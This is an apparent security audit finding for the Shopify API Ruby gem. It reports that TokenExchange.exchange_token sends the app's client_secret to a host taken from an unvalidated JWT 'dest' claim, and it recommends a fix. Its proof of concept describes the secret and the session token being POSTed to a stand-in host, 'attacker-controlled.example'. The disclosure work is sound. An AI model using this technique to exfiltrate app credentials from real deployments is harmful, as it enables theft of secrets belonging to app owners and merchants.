### Title
`TokenExchange.exchange_token` sends the app's `client_secret` to an unvalidated host derived from the JWT `dest` claim - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the request host for the token-exchange call directly from the session token's `dest` claim, without passing it through `ShopifyAPI::Utils::ShopValidator`, unlike every other OAuth credential-issuing method in the same module family (`RefreshToken.refresh_access_token`, `ClientCredentials.client_credentials`, `TokenExchange.migrate_to_expiring_token`).

### Finding Description
`JwtPayload#shop` returns `@dest.gsub("https://", "")` [1](#0-0)  without any check that the value is a real Shopify domain — the only checks performed during decoding are JWT signature validity and `aud == Context.api_key` [2](#0-1) . The `dest` claim itself is never constrained to `TRUSTED_SHOPIFY_DOMAINS`.

`TokenExchange.exchange_token` takes this unvalidated value and uses it directly as the session's `shop`, which `Clients::HttpClient` then turns into the literal request host: [3](#0-2) [4](#0-3) 

The request body sent to that host contains the app's `client_id`, `client_secret`, and the raw `session_token`: [5](#0-4) 

Contrast this with the three sibling methods that build the same kind of request but explicitly sanitize the shop first: [6](#0-5) [7](#0-6) [8](#0-7) 

`ShopValidator.sanitize!` restricts the resulting host to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) plus an optional configured `myshopify_domain` [9](#0-8) . `exchange_token` performs none of this, so the equality that should hold — "the host that is cryptographically authorized to receive the app's `client_secret`" == "the host actually addressed by the outgoing HTTP request" — is enforced for `RefreshToken`/`ClientCredentials`/`migrate_to_expiring_token`, but not for `exchange_token`. The CHANGELOG entry for this exact change ("Derive the target shop for `TokenExchange.exchange_token` from the session token's `dest` claim") confirms this was a deliberate but incomplete refactor [10](#0-9) .

### Impact Explanation
If the `dest` claim of a validly-signed session token is ever anything other than a genuine Shopify shop domain (e.g. a non-canonical value accepted by Shopify's token issuance for some embedding/extension context, as seen in the checkout UI extension payload which even omits the `https://` scheme in tests) [11](#0-10) , `exchange_token` will POST the app's `client_id`, `client_secret`, and the bearer session token to that value as an HTTPS host. This is SSRF carrying the app's own OAuth credentials to a host that was never checked against the trusted-domain allowlist the gem itself defines and applies everywhere else in the OAuth surface, i.e. exfiltration of the app's `client_secret` to a party controlled by the destination.

### Likelihood Explanation
Exploitability depends entirely on whether an attacker can obtain or induce issuance of a validly-signed session token whose `dest` value is not a canonical `*.myshopify.com`/trusted domain. In the normal App Bridge flow Shopify mints this token and sets `dest`, so this is not trivially attacker-controlled — but the gem provides no defense-in-depth here at all, whereas it explicitly added that defense to three sibling methods in the same release. This is a real gap in the trust boundary, best-labeled Medium/High depending on how strictly Shopify constrains `dest` values across all token-issuing contexts (admin embed vs. checkout extensions vs. future integrations).

### Recommendation
Route `dest_shop` in `TokenExchange.exchange_token` through `Utils::ShopValidator.sanitize!` (as already done in `migrate_to_expiring_token`, `RefreshToken.refresh_access_token`, and `ClientCredentials.client_credentials`) before constructing `shop_session` and issuing the HTTP request, and raise `Errors::InvalidShopError` if the `dest` claim does not resolve to a trusted domain.

### Proof of Concept
1. Obtain (or have Shopify issue in some non-canonical embedding context) a session token whose `dest` claim is not restricted to a `TRUSTED_SHOPIFY_DOMAINS` value, e.g. `dest: "https://attacker-controlled.example"`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. Observe that `Clients::HttpClient` builds `@base_uri = "https://attacker-controlled.example"` [4](#0-3)  and POSTs `client_id`, `client_secret`, and `subject_token` to `https://attacker-controlled.example/admin/oauth/access_token` — compare with `RefreshToken.refresh_access_token(shop: "https://attacker-controlled.example", ...)` which instead raises `Errors::InvalidShopError` via `ShopValidator.sanitize!` [12](#0-11) .
